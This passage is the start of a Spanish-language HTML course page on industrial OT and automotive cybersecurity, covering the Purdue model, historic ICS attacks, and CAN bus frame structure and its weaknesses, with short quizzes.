@@ -1,0 +1,842 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta name="theme-color" content="#00D9FF">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Industrial OT & Automotive Cybersecurity (CAN Bus & IIoT Security) | AutoNovations Academy</title>
+  <script>
+    (function () {
+      const savedTheme = localStorage.getItem('preferredTheme') || 'dark';
+      if (savedTheme === 'light') { document.documentElement.classList.add('light'); }
+      else { document.documentElement.classList.remove('light'); }
+    })();
+  </script>
+  <meta name="description" content="Curso avanzado de Ciberseguridad Industrial OT y Automotriz. Aprende CAN Bus Hacking, protección de redes IIoT, SCADA, Modbus/TCP, ISO/SAE 21434 e IEC 62443.">
+  <meta name="keywords" content="Automotive Cybersecurity, CAN Bus, IIoT Security, SCADA, Modbus, OT Cybersecurity, SocketCAN, ISO/SAE 21434, IEC 62443, ECU Hacking, AutoNovations Academy">
+  <meta name="author" content="AutoNovations Academy">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;600&family=Inter:wght@300;400;500;600;700&family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <script src="../assets/js/lucide.min.js"></script>
+  <style>
+    :root {
+      --bg-darker: #050811; --bg-dark: #0a0f1d; --bg-card: #101728;
+      --bg-card-hover: #18233c; --border: #1e2c48; --border-focus: #00f0ff;
+      --accent-cyan: #00f0ff; --accent-cyan-dim: rgba(0,240,255,0.12);
+      --accent-green: #10b981; --accent-green-neon: #39ff14;
+      --accent-green-dim: rgba(16,185,129,0.15);
+      --accent-red: #ef4444; --accent-red-neon: #ff3366;
+      --accent-red-dim: rgba(239,68,68,0.15);
+      --accent-amber: #f59e0b; --accent-amber-dim: rgba(245,158,11,0.15);
+      --accent-purple: #a855f7; --accent-purple-dim: rgba(168,85,247,0.15);
+      --accent-blue: #3b82f6; --accent-blue-dim: rgba(59,130,246,0.12);
+      --text-primary: #f3f4f6; --text-secondary: #9ca3af; --text-muted: #6b7280;
+      --font-sans: 'Inter', -apple-system, sans-serif;
+      --font-display: 'Space Grotesk', sans-serif;
+      --font-mono: 'Fira Code', monospace;
+      --radius-sm: 4px; --radius-md: 8px; --radius-lg: 12px;
+      --transition: all 0.25s cubic-bezier(0.4,0,0.2,1);
+    }
+    html.light {
+      --bg-darker: #f3f4f6; --bg-dark: #ffffff; --bg-card: #ffffff;
+      --bg-card-hover: #f9fafb; --border: #e5e7eb; --border-focus: #2563eb;
+      --accent-cyan: #0284c7; --accent-cyan-dim: rgba(2,132,199,0.1);
+      --accent-green: #059669; --accent-green-neon: #10b981;
+      --accent-green-dim: rgba(5,150,105,0.1);
+      --accent-red: #dc2626; --accent-red-neon: #ef4444;
+      --accent-red-dim: rgba(220,38,38,0.1);
+      --accent-amber: #d97706; --accent-amber-dim: rgba(217,119,6,0.1);
+      --accent-purple: #7c3aed; --accent-purple-dim: rgba(124,58,237,0.1);
+      --accent-blue: #2563eb; --accent-blue-dim: rgba(37,99,235,0.1);
+      --text-primary: #111827; --text-secondary: #4b5563; --text-muted: #9ca3af;
+    }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body { background-color: var(--bg-darker); color: var(--text-primary); font-family: var(--font-sans); line-height: 1.6; overflow-x: hidden; transition: background-color 0.3s, color 0.3s; }
+    ::-webkit-scrollbar { width: 6px; height: 6px; }
+    ::-webkit-scrollbar-track { background: var(--bg-darker); }
+    ::-webkit-scrollbar-thumb { background: var(--border); border-radius: var(--radius-sm); }
+    ::-webkit-scrollbar-thumb:hover { background: var(--accent-cyan); }
+    .app-container { display: flex; min-height: 100vh; }
+    .sidebar { width: 290px; background-color: var(--bg-dark); border-right: 1px solid var(--border); display: flex; flex-direction: column; position: fixed; top: 0; bottom: 0; left: 0; z-index: 100; padding: 1.5rem; transition: transform 0.3s; overflow-y: auto; }
+    .sidebar-brand { display: flex; align-items: center; gap: 10px; font-family: var(--font-display); font-size: 1.05rem; font-weight: 700; color: var(--accent-cyan); letter-spacing: 0.05em; margin-bottom: 0.5rem; text-transform: uppercase; text-decoration: none; }
+    .sidebar-subtitle { font-size: 0.7rem; color: var(--text-muted); text-transform: uppercase; letter-spacing: 0.08em; margin-bottom: 1.5rem; padding-left: 34px; }
+    .nav-section-label { font-size: 0.65rem; font-weight: 700; text-transform: uppercase; letter-spacing: 0.12em; color: var(--text-muted); padding: 0.75rem 0 0.4rem 0; border-top: 1px solid var(--border); margin-top: 0.5rem; }
+    .nav-list { list-style: none; display: flex; flex-direction: column; gap: 3px; }
+    .nav-item button { width: 100%; background: none; border: none; outline: none; color: var(--text-secondary); font-family: var(--font-sans); font-size: 0.8rem; font-weight: 500; text-align: left; padding: 8px 12px; border-radius: var(--radius-md); cursor: pointer; display: flex; align-items: center; gap: 10px; transition: var(--transition); border: 1px solid transparent; }
+    .nav-item button:hover { background-color: var(--bg-card-hover); color: var(--text-primary); }
+    .nav-item.active button { background-color: var(--accent-cyan-dim); color: var(--accent-cyan); border: 1px solid rgba(0,240,255,0.25); }
+    .nav-item.completed button { color: var(--accent-green); }
+    .nav-check { display: none; color: var(--accent-green); margin-left: auto; }
+    .nav-item.completed .nav-check { display: inline-block; }
+    .nav-num { min-width: 20px; height: 20px; border-radius: 50%; background: var(--border); color: var(--text-muted); font-size: 0.65rem; font-weight: 700; display: flex; align-items: center; justify-content: center; flex-shrink: 0; }
+    .nav-item.active .nav-num { background: var(--accent-cyan); color: #06090f; }
+    .nav-item.completed .nav-num { background: var(--accent-green-dim); color: var(--accent-green); }
+    .progress-box { background-color: var(--bg-card); border: 1px solid var(--border); border-radius: var(--radius-lg); padding: 1.25rem; margin-top: 1.5rem; text-align: center; }
+    .progress-box-title { font-family: var(--font-display); font-size: 0.72rem; font-weight: 600; color: var(--text-secondary); text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 8px; }
+    .progress-circle-wrapper { position: relative; width: 90px; height: 90px; margin: 0 auto 8px; }
+    .progress-svg { width: 100%; height: 100%; transform: rotate(-90deg); }
+    .progress-bg-circle { fill: none; stroke: var(--border); stroke-width: 8; }
+    .progress-bar-circle { fill: none; stroke: var(--accent-cyan); stroke-width: 8; stroke-dasharray: 226; stroke-dashoffset: 226; transition: stroke-dashoffset 0.8s cubic-bezier(0.4,0,0.2,1); stroke-linecap: round; }
+    .progress-text { position: absolute; top: 50%; left: 50%; transform: translate(-50%,-50%); font-family: var(--font-display); font-size: 1.1rem; font-weight: 700; color: var(--accent-cyan); }
+    .progress-details { font-size: 0.7rem; color: var(--text-muted); }
+    .main-content { margin-left: 290px; flex-grow: 1; padding: 2.5rem; max-width: calc(100% - 290px); min-height: 100vh; display: flex; flex-direction: column; transition: margin-left 0.3s, max-width 0.3s; }
+    .content-header { margin-bottom: 2.5rem; border-bottom: 1px solid var(--border); padding-bottom: 1.5rem; display: flex; justify-content: space-between; align-items: flex-start; }
+    .content-header h1 { font-family: var(--font-display); font-size: 1.7rem; font-weight: 700; color: var(--text-primary); margin-bottom: 6px; display: flex; align-items: center; gap: 12px; }
+    .content-header p { color: var(--text-secondary); font-size: 0.92rem; }
+    .header-actions { display: flex; align-items: center; gap: 10px; flex-shrink: 0; margin-left: 1rem; }
+    .theme-toggle-btn { background: var(--bg-card); border: 1px solid var(--border); color: var(--text-primary); width: 38px; height: 38px; border-radius: var(--radius-md); cursor: pointer; display: flex; align-items: center; justify-content: center; transition: var(--transition); }
+    .theme-toggle-btn:hover { border-color: var(--accent-cyan); }
+    .mobile-menu-btn { display: none; background: var(--bg-card); border: 1px solid var(--border); color: var(--text-primary); width: 38px; height: 38px; border-radius: var(--radius-md); cursor: pointer; align-items: center; justify-content: center; transition: var(--transition); }
+    .tab-pane { display: none; animation: fadeIn 0.4s ease; }
+    .tab-pane.active { display: block; }
+    @keyframes fadeIn { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: translateY(0); } }
+    .learning-section { background-color: var(--bg-card); border: 1px solid var(--border); border-radius: var(--radius-lg); padding: 2rem; margin-bottom: 1.75rem; }
+    .learning-section h2 { font-family: var(--font-display); font-size: 1.35rem; margin-bottom: 1.25rem; color: var(--accent-cyan); border-bottom: 1px solid var(--border); padding-bottom: 8px; display: flex; align-items: center; gap: 10px; }
+    .learning-section h3 { font-family: var(--font-display); font-size: 1.05rem; margin: 1.5rem 0 0.6rem 0; color: var(--text-primary); display: flex; align-items: center; gap: 8px; }
+    .learning-section h4 { font-family: var(--font-display); font-size: 0.95rem; margin: 1.2rem 0 0.5rem 0; color: var(--accent-amber); }
+    .learning-section p { color: var(--text-secondary); font-size: 0.93rem; margin-bottom: 1rem; line-height: 1.75; }
+    .learning-section ul, .learning-section ol { margin-left: 1.5rem; margin-bottom: 1rem; color: var(--text-secondary); }
+    .learning-section li { margin-bottom: 5px; font-size: 0.93rem; line-height: 1.6; }
+    .definition-box { background-color: var(--bg-darker); border-left: 3px solid var(--accent-cyan); padding: 1rem 1.25rem; border-radius: 0 var(--radius-md) var(--radius-md) 0; margin: 1rem 0; }
+    .definition-term { font-family: var(--font-display); font-weight: 700; color: var(--accent-cyan); font-size: 0.88rem; margin-bottom: 4px; text-transform: uppercase; letter-spacing: 0.05em; }
+    .definition-desc { font-size: 0.87rem; color: var(--text-secondary); line-height: 1.55; }
+    .alert-box { padding: 1rem 1.25rem; border-radius: var(--radius-lg); margin: 1.25rem 0; display: flex; gap: 12px; align-items: flex-start; border: 1px solid transparent; }
+    .alert-box.info { background-color: var(--accent-cyan-dim); border-color: rgba(0,240,255,0.2); }
+    .alert-box.info i { color: var(--accent-cyan); flex-shrink: 0; margin-top: 2px; }
+    .alert-box.warn { background-color: var(--accent-amber-dim); border-color: rgba(245,158,11,0.25); }
+    .alert-box.warn i { color: var(--accent-amber); flex-shrink: 0; margin-top: 2px; }
+    .alert-box.success { background-color: var(--accent-green-dim); border-color: rgba(16,185,129,0.25); }
+    .alert-box.success i { color: var(--accent-green); flex-shrink: 0; margin-top: 2px; }
+    .alert-box.danger { background-color: var(--accent-red-dim); border-color: rgba(239,68,68,0.25); }
+    .alert-box.danger i { color: var(--accent-red); flex-shrink: 0; margin-top: 2px; }
+    .alert-box-text { font-size: 0.87rem; line-height: 1.65; color: var(--text-primary); }
+    .code-block { background: #020509; border: 1px solid var(--border); border-radius: var(--radius-md); margin: 1rem 0; overflow: hidden; }
+    .code-block-header { display: flex; justify-content: space-between; align-items: center; padding: 8px 14px; background: rgba(255,255,255,0.03); border-bottom: 1px solid var(--border); }
+    .code-lang { font-size: 0.7rem; text-transform: uppercase; letter-spacing: 0.08em; color: var(--text-muted); font-family: var(--font-mono); }
+    .code-copy-btn { background: none; border: 1px solid var(--border); color: var(--text-muted); padding: 3px 8px; border-radius: var(--radius-sm); font-size: 0.7rem; cursor: pointer; transition: var(--transition); display: flex; align-items: center; gap: 4px; }
+    .code-copy-btn:hover { border-color: var(--accent-cyan); color: var(--accent-cyan); }
+    .code-block pre { padding: 1rem 1.25rem; overflow-x: auto; font-family: var(--font-mono); font-size: 0.83rem; line-height: 1.7; color: #e2e8f0; }
+    .code-block pre .cmd { color: var(--accent-cyan); }
+    .code-block pre .out { color: var(--accent-green); }
+    .code-block pre .cmt { color: var(--text-muted); font-style: italic; }
+    .code-block pre .kw { color: #c084fc; }
+    .code-block pre .str { color: #fbbf24; }
+    .code-block pre .num { color: #fb923c; }
+    .code-block pre .flag { color: var(--accent-amber); }
+    .quiz-section { background-color: var(--bg-card); border: 1px solid var(--border); border-radius: var(--radius-lg); padding: 1.75rem; margin-bottom: 1.75rem; }
+    .quiz-title-bar { display: flex; align-items: center; gap: 10px; font-family: var(--font-display); font-size: 1.1rem; font-weight: 600; color: var(--accent-cyan); margin-bottom: 1.5rem; border-bottom: 1px solid var(--border); padding-bottom: 10px; }
+    .quiz-question { margin-bottom: 1.5rem; }
+    .q-text { font-size: 0.92rem; font-weight: 600; color: var(--text-primary); margin-bottom: 10px; }
+    .q-options { display: flex; flex-direction: column; gap: 7px; }
+    .q-option { background: var(--bg-darker); border: 1px solid var(--border); color: var(--text-secondary); padding: 9px 14px; border-radius: var(--radius-md); font-size: 0.85rem; cursor: pointer; text-align: left; transition: var(--transition); }
+    .q-option:hover { border-color: var(--accent-cyan); color: var(--text-primary); }
+    .q-option.correct { background-color: var(--accent-green-dim); border-color: var(--accent-green); color: var(--accent-green-neon); pointer-events: none; }
+    .q-option.incorrect { background-color: var(--accent-red-dim); border-color: var(--accent-red); color: var(--accent-red-neon); pointer-events: none; }
+    .q-option.disabled { pointer-events: none; opacity: 0.5; }
+    .q-explanation { font-size: 0.82rem; color: var(--text-secondary); margin-top: 8px; padding: 8px 12px; background: var(--bg-darker); border-radius: var(--radius-sm); display: none; border-left: 3px solid var(--accent-cyan); }
+    .module-actions { display: flex; justify-content: space-between; align-items: center; margin-top: 2rem; border-top: 1px solid var(--border); padding-top: 1.5rem; flex-wrap: wrap; gap: 10px; }
+    .action-btn { background: var(--bg-card); border: 1px solid var(--border); color: var(--text-primary); padding: 10px 18px; border-radius: var(--radius-md); cursor: pointer; font-weight: 600; font-size: 0.87rem; display: flex; align-items: center; gap: 8px; transition: var(--transition); font-family: var(--font-sans); text-decoration: none; }
+    .action-btn:hover { border-color: var(--accent-cyan); color: var(--accent-cyan); }
+    .action-btn.primary { background: var(--accent-cyan-dim); border-color: var(--accent-cyan); color: var(--accent-cyan); }
+    .action-btn.primary:hover { background: var(--accent-cyan); color: #06090f; }
+    .action-btn:disabled { opacity: 0.4; pointer-events: none; }
+    .read-confirmation { display: flex; align-items: center; gap: 10px; background: var(--bg-darker); border: 1px solid var(--border); padding: 9px 14px; border-radius: var(--radius-md); }
+    .read-checkbox { width: 16px; height: 16px; cursor: pointer; accent-color: var(--accent-cyan); }
+    .read-label { font-size: 0.85rem; font-weight: 600; cursor: pointer; color: var(--text-secondary); }
+    .compare-table { width: 100%; border-collapse: collapse; font-size: 0.85rem; margin: 1rem 0; }
+    .compare-table th { background: var(--bg-darker); color: var(--accent-cyan); padding: 10px 12px; text-align: left; font-family: var(--font-display); font-weight: 600; border: 1px solid var(--border); }
+    .compare-table td { padding: 9px 12px; border: 1px solid var(--border); color: var(--text-secondary); vertical-align: top; }
+    .compare-table tr:hover td { background: var(--bg-card-hover); }
+    .compare-table .highlight { color: var(--accent-cyan); font-weight: 600; }
+    .compare-table .good { color: var(--accent-green); }
+    .compare-table .bad { color: var(--accent-red); }
+    .info-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px,1fr)); gap: 1rem; margin: 1.25rem 0; }
+    .info-card { background: var(--bg-darker); border: 1px solid var(--border); border-radius: var(--radius-md); padding: 1.25rem; border-top: 3px solid var(--accent-cyan); transition: var(--transition); }
+    .info-card:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(0,0,0,0.3); }
+    .info-card-icon { color: var(--accent-cyan); margin-bottom: 10px; }
+    .info-card-title { font-family: var(--font-display); font-size: 0.95rem; font-weight: 700; color: var(--text-primary); margin-bottom: 5px; }
+    .info-card-desc { font-size: 0.82rem; color: var(--text-secondary); line-height: 1.5; }
+    .level-badge { display: inline-flex; align-items: center; gap: 5px; font-size: 0.72rem; padding: 3px 8px; border-radius: var(--radius-sm); font-weight: 700; text-transform: uppercase; letter-spacing: 0.05em; }
+    .badge-master { background: var(--accent-purple-dim); color: var(--accent-purple); border: 1px solid rgba(168,85,247,0.3); }
+    .badge-danger { background: var(--accent-red-dim); color: var(--accent-red-neon); border: 1px solid rgba(239,68,68,0.3); }
+    .badge-success { background: var(--accent-green-dim); color: var(--accent-green-neon); border: 1px solid rgba(16,185,129,0.3); }
+    .ascii-diagram { background: #020509; border: 1px solid var(--border); border-radius: var(--radius-md); padding: 1.25rem; font-family: var(--font-mono); font-size: 0.78rem; line-height: 1.8; color: var(--accent-cyan); margin: 1rem 0; overflow-x: auto; white-space: pre; }
+    .sidebar-overlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.6); z-index: 99; backdrop-filter: blur(2px); }
+    .sidebar-overlay.open { display: block; }
+    
+    /* Interactive Simulator Styles */
+    .sim-panel { background: var(--bg-dark); border: 1px solid var(--border); border-radius: var(--radius-lg); padding: 1.5rem; margin-top: 1rem; }
+    .sim-controls { display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 1.25rem; }
+    .sim-btn { background: var(--bg-card); border: 1px solid var(--border); color: var(--text-primary); padding: 8px 14px; border-radius: var(--radius-md); font-size: 0.8rem; font-family: var(--font-mono); cursor: pointer; transition: var(--transition); display: flex; align-items: center; gap: 6px; }
+    .sim-btn:hover { border-color: var(--accent-cyan); color: var(--accent-cyan); }
+    .sim-btn.danger { border-color: var(--accent-red); color: var(--accent-red); }
+    .sim-btn.danger:hover { background: var(--accent-red-dim); }
+    .sim-btn.active { background: var(--accent-cyan-dim); border-color: var(--accent-cyan); color: var(--accent-cyan); }
+    .sim-btn.danger.active { background: var(--accent-red-dim); border-color: var(--accent-red); color: var(--accent-red-neon); }
+
+    .telemetry-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 1rem; margin-bottom: 1.25rem; }
+    .gauge-card { background: var(--bg-darker); border: 1px solid var(--border); border-radius: var(--radius-md); padding: 1rem; text-align: center; }
+    .gauge-title { font-size: 0.72rem; text-transform: uppercase; color: var(--text-muted); font-family: var(--font-display); letter-spacing: 0.05em; }
+    .gauge-val { font-family: var(--font-mono); font-size: 1.5rem; font-weight: 700; color: var(--accent-cyan); margin: 6px 0; }
+    .gauge-status { font-size: 0.75rem; font-weight: 600; text-transform: uppercase; }
+
+    .terminal-box { background: #010408; border: 1px solid var(--border); border-radius: var(--radius-md); padding: 1rem; font-family: var(--font-mono); font-size: 0.8rem; height: 240px; overflow-y: auto; color: #a5f3fc; }
+    .term-line { margin-bottom: 4px; display: flex; gap: 12px; }
+    .term-time { color: var(--text-muted); }
+    .term-id { color: #f43f5e; font-weight: 700; }
+    .term-id.normal { color: #38bdf8; }
+    .term-data { color: #fde047; }
+    .term-status { color: #4ade80; }
+    .term-status.alert { color: #f43f5e; font-weight: 700; }
+
+    @media (max-width: 1024px) { .sidebar { transform: translateX(-100%); } .sidebar.open { transform: translateX(0); box-shadow: 4px 0 30px rgba(0,0,0,0.5); } .main-content { margin-left: 0; max-width: 100%; } .mobile-menu-btn { display: flex; } }
+    @media (max-width: 640px) { .main-content { padding: 1.25rem; } .content-header h1 { font-size: 1.3rem; } .module-actions { flex-direction: column; } }
+    code { color: var(--accent-cyan); font-family: var(--font-mono); font-size: 0.85em; background: var(--bg-darker); padding: 2px 6px; border-radius: 3px; }
+  </style>
+</head>
+<body>
+<div class="sidebar-overlay" id="sidebarOverlay" onclick="closeSidebar()"></div>
+<div class="app-container">
+  <!-- SIDEBAR -->
+  <aside class="sidebar" id="sidebar">
+    <a class="sidebar-brand" href="../index.html">
+      <i data-lucide="shield-check" style="width:20px;height:20px;flex-shrink:0;color:var(--accent-cyan);"></i>
+      AutoNovations
+    </a>
+    <div class="sidebar-subtitle">Industrial OT &amp; Automotive Cybersecurity</div>
+    <div class="progress-box">
+      <div class="progress-box-title">Progreso del Curso</div>
+      <div class="progress-circle-wrapper">
+        <svg class="progress-svg" viewBox="0 0 80 80">
+          <circle class="progress-bg-circle" cx="40" cy="40" r="36"/>
+          <circle class="progress-bar-circle" id="progressCircle" cx="40" cy="40" r="36"/>
+        </svg>
+        <div class="progress-text" id="progressText">0%</div>
+      </div>
+      <div class="progress-details" id="progressDetails">0 de 6 módulos</div>
+    </div>
+    <div class="nav-section-label">Módulos del Curso</div>
+    <ul class="nav-list" id="navList">
+      <li class="nav-item active" data-tab="tab-01"><button onclick="switchTab('tab-01',this)"><span class="nav-num">1</span>Intro Ciberseguridad OT &amp; Purdue<i data-lucide="check-circle" class="nav-check" style="width:14px;height:14px;"></i></button></li>
+      <li class="nav-item" data-tab="tab-02"><button onclick="switchTab('tab-02',this)"><span class="nav-num">2</span>CAN Bus &amp; Redes Vehiculares<i data-lucide="check-circle" class="nav-check" style="width:14px;height:14px;"></i></button></li>
+      <li class="nav-item" data-tab="tab-03"><button onclick="switchTab('tab-03',this)"><span class="nav-num">3</span>Automotive Hacking &amp; CLI<i data-lucide="check-circle" class="nav-check" style="width:14px;height:14px;"></i></button></li>
+      <li class="nav-item" data-tab="tab-04"><button onclick="switchTab('tab-04',this)"><span class="nav-num">4</span>Modbus, SCADA &amp; IIoT Defense<i data-lucide="check-circle" class="nav-check" style="width:14px;height:14px;"></i></button></li>
+      <li class="nav-item" data-tab="tab-05"><button onclick="switchTab('tab-05',this)"><span class="nav-num">5</span>Estándares ISO 21434 &amp; SecOC<i data-lucide="check-circle" class="nav-check" style="width:14px;height:14px;"></i></button></li>
+      <li class="nav-item" data-tab="tab-06"><button onclick="switchTab('tab-06',this)"><span class="nav-num">6</span>Simulador Live CAN Bus &amp; IDS<i data-lucide="check-circle" class="nav-check" style="width:14px;height:14px;"></i></button></li>
+    </ul>
+  </aside>
+
+  <!-- MAIN CONTENT -->
+  <main class="main-content">
+    <div class="content-header">
+      <div>
+        <h1>
+          <i data-lucide="shield-alert" style="width:28px;height:28px;color:var(--accent-red-neon);"></i>
+          Industrial OT &amp; Automotive Cybersecurity
+        </h1>
+        <p>CAN Bus · SCADA · Modbus/TCP · Automotive Hacking · SecOC · ISO/SAE 21434 · IEC 62443</p>
+      </div>
+      <div class="header-actions">
+        <button class="mobile-menu-btn" id="mobileMenuBtn" onclick="toggleSidebar()" aria-label="Menú">
+          <i data-lucide="menu" style="width:18px;height:18px;"></i>
+        </button>
+        <button class="theme-toggle-btn" id="themeBtn" onclick="toggleTheme()" aria-label="Cambiar tema">
+          <i data-lucide="sun" style="width:16px;height:16px;" id="themeIcon"></i>
+        </button>
+        <a href="../index.html" class="action-btn" style="text-decoration:none;">
+          <i data-lucide="home" style="width:14px;height:14px;"></i> Inicio
+        </a>
+      </div>
+    </div>
+
+    <!-- Cover Image Hero Preview -->
+    <div style="width:100%; height: 260px; border-radius: var(--radius-lg); overflow: hidden; margin-bottom: 2rem; border: 1px solid var(--border); position: relative;">
+      <img src="../assets/images/courses/ot_automotive_cybersecurity_cover.png" alt="Industrial OT & Automotive Cybersecurity Cover" style="width: 100%; height: 100%; object-fit: cover;">
+      <div style="position: absolute; inset: 0; background: linear-gradient(180deg, rgba(5,8,17,0.2) 0%, rgba(5,8,17,0.88) 100%); display: flex; align-items: flex-end; padding: 1.5rem;">
+        <span class="level-badge badge-master">Level 3 · Security Master Architect</span>
+      </div>
+    </div>
+
+    <!-- TAB 01 -->
+    <div class="tab-pane active" id="tab-01">
+      <div class="learning-section">
+        <h2><i data-lucide="factory" style="width:20px;height:20px;"></i> Capítulo 1 · Ciberseguridad OT &amp; Modelo Purdue Industrial</h2>
+        <p>A diferencia de la tecnología de información tradicional (IT) enfocada en la <strong>Confidencialidad</strong>, la Tecnología de Operación (<strong>OT</strong>) prioriza la <strong>Disponibilidad y Seguridad Física (Safety)</strong>. Un ciberataque en una planta química o sistema de frenado automotriz tiene consecuencias en el mundo físico.</p>
+        
+        <div class="definition-box">
+          <div class="definition-term">¿Qué es el Modelo Purdue (PERA)?</div>
+          <div class="definition-desc">El Modelo de Arquitectura de Referencia Purdue clasifica las redes industriales en 6 niveles jerárquicos (Nivel 0: Sensores/Actuadores hasta Nivel 5: Enterprise Nube), estableciendo fronteras de seguridad mediante DMZ Industriales.</div>
+        </div>
+
+        <div class="ascii-diagram">
+┌─────────────────────────────────────────────────────────────────────────────┐
+<span style="color:var(--accent-cyan)">│                     ARQUITECTURA MODELO PURDUE (PERA)                       │</span>
+│                                                                             │
+│  [ Level 4 / 5 ]  ERP, Enterprise IT Cloud Network                          │
+│         │                                                                   │
+│  ───────┼─────────────────── Industrial DMZ Firewall ────────────────────── │
+│         │                                                                   │
+│  [ Level 3 ]      SCADA Control, Historian Servers, Fleet Telemetry          │
+│         │                                                                   │
+│  [ Level 2 ]      HMI Consoles, Control Room Systems                        │
+│         │                                                                   │
+│  [ Level 1 ]      PLCs, PACs, Safety Instrumented Systems (SIS)             │
+│         │                                                                   │
+│  [ Level 0 ]      Physical Sensors, Motors, CAN Bus Field Devices           │
+└─────────────────────────────────────────────────────────────────────────────┘
+        </div>
+
+        <h3><i data-lucide="alert-triangle" style="width:16px;height:16px;color:var(--accent-amber);"></i> Principales Casos de Amenazas Históricas en OT</h3>
+        <ul>
+          <li><strong>Stuxnet (2010):</strong> El primer ciberarma cibernético diseñado para manipular PLCs Siemens S7-300 y destruir centrifugadoras físicas en Natanz.</li>
+          <li><strong>Industroyer / CrashOverride (2016):</strong> Malware diseñado para subestaciones eléctricas utilizando protocolos ICS crudos (IEC 60870-5-104, IEC 61850).</li>
+          <li><strong>Jeep Hack by Miller &amp; Valasek (2015):</strong> Explotación remota a través del sistema de Infotenimiento conectándose al CAN Bus para deshabilitar frenos en carretera.</li>
+        </ul>
+      </div>
+
+      <div class="quiz-section">
+        <div class="quiz-title-bar"><i data-lucide="help-circle" style="width:20px;height:20px;"></i> Cuestionario — Capítulo 1</div>
+        <div class="quiz-question" id="q1-1">
+          <div class="q-text">1. En Ciberseguridad OT e Industrial, ¿cuál es la máxima prioridad del triada CIA?</div>
+          <div class="q-options">
+            <button class="q-option" onclick="checkAnswer(this,'q1-1',false)">A) Confidencialidad de los archivos PDF</button>
+            <button class="q-option" onclick="checkAnswer(this,'q1-1',true)">B) Disponibilidad y Seguridad Física (Safety/Availability)</button>
+            <button class="q-option" onclick="checkAnswer(this,'q1-1',false)">C) Cifrado de contraseñas de correos corporativos</button>
+          </div>
+          <div class="q-explanation">En entornos OT, una interrupción en tiempo real puede causar catástrofes físicas o lesiones humanas. Por ello, la disponibilidad y la integridad operativa prevalecen sobre el cifrado de datos estáticos.</div>
+        </div>
+      </div>
+
+      <div class="module-actions">
+        <div class="read-confirmation">
+          <input type="checkbox" class="read-checkbox" id="check-01" onchange="toggleModuleRead('tab-01')">
+          <label class="read-label" for="check-01">Marcar Capítulo 1 como completado</label>
+        </div>
+        <button class="action-btn primary" onclick="switchTab('tab-02', document.querySelectorAll('.nav-item')[1].querySelector('button'))">Capítulo Siguiente <i data-lucide="arrow-right" style="width:14px;height:14px;"></i></button>
+      </div>
+    </div>
+
+    <!-- TAB 02 -->
+    <div class="tab-pane" id="tab-02">
+      <div class="learning-section">
+        <h2><i data-lucide="car" style="width:20px;height:20px;"></i> Capítulo 2 · Protocolo CAN Bus &amp; Arquitectura In-Vehicle</h2>
+        <p>El bus <strong>CAN (Controller Area Network)</strong> fue desarrollado por Bosch en 1986 y es el estándar de comunicación en todos los vehículos modernos y maquinaria pesada industrial.</p>
+
+        <div class="alert-box warn">
+          <i data-lucide="alert-octagon"></i>
+          <div class="alert-box-text">
+            <strong>Vulnerabilidad Nativa del Bus CAN:</strong> El protocolo CAN Bus no incluye ningún mecanismo nativo de autenticación, cifrado o dirección de origen/destino. Cualquier ECU conectada al bus puede leer todas las transmisiones y suplantar cualquier ID de mensaje (Spoofing).
+          </div>
+        </div>
+
+        <h3>Estructura Interna de un Frame CAN 2.0B (Standard &amp; Extended)</h3>
+        <div class="ascii-diagram">
+┌───┬────────────────┬─────┬───────┬─────────────────────┬────────┬─────┬───┐
+│SOF│ Arbitration ID │ RTR │ DLC   │ Data Payload (0-8B) │ CRC    │ ACK │EOF│
+├───┼────────────────┼─────┼───────┼─────────────────────┼────────┼─────┼───┤
+│ 1 │ 11/29 bits     │ 1   │ 4 bits│ 0 - 64 bytes        │ 15 bits│ 2   │ 7 │
+└───┴────────────────┴─────┴───────┴─────────────────────┴────────┴─────┴───┘
+        </div>
+
+        <table class="compare-table">
+          <thead><tr><th>Campo Frame CAN</th><th>Función</th><th>Relevancia en Ciberseguridad</th></tr></thead>
+          <tbody>
+            <tr><td class="highlight">Arbitration ID</td><td>Identificador del mensaje y prioridad (menor ID = mayor prioridad).</td><td>Permite ataques Bus-Off DoS enviando paquetes con ID 0x000.</td></tr>
+            <tr><td class="highlight">DLC (Data Length)</td><td>Indica el número de bytes de datos (0 a 8 bytes en CAN 2.0).</td><td>Se usa para validar estructuras de paquetes esperadas.</td></tr>
+            <tr><td class="highlight">Data Payload</td><td>Valores físicos de sensores (RPM, Ángulo de Dirección, Presión).</td><td>Inyección de comandos maliciosos para modificar actuadores físicos.</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="quiz-section">
+        <div class="quiz-title-bar"><i data-lucide="help-circle" style="width:20px;height:20px;"></i> Cuestionario — Capítulo 2</div>
+        <div class="quiz-question" id="q2-1">
+          <div class="q-text">1. ¿Qué sucede cuando dos ECUs transmiten simultáneamente en un bus CAN?</div>
+          <div class="q-options">
+            <button class="q-option" onclick="checkAnswer(this,'q2-1',true)">A) La ECU con el Arbitration ID numéricamente MENOR gana la arbitración sin colisión de bits</button>
+            <button class="q-option" onclick="checkAnswer(this,'q2-1',false)">B) La red colapsa y requiere reinicio por hardware</button>
+            <button class="q-option" onclick="checkAnswer(this,'q2-1',false)">C) El paquete de mayor ID borra al paquete menor</button>
+          </div>
+          <div class="q-explanation">En CAN Bus, los bits '0' son dominantes sobre los bits '1' recesivos. Por ello, el mensaje con menor ID (ej. 0x000 frente a 0x1A0) gana la arbitración sin perder tiempo de retransmisión.</div>
+        </div>
+      </div>
+
+      <div class="module-actions">
+        <div class="read-confirmation">
+          <input type="checkbox" class="read-checkbox" id="check-02" onchange="toggleModuleRead('tab-02')">
+          <label class="read-label" for="check-02">Marcar Capítulo 2 como completado</label>
+        </div>
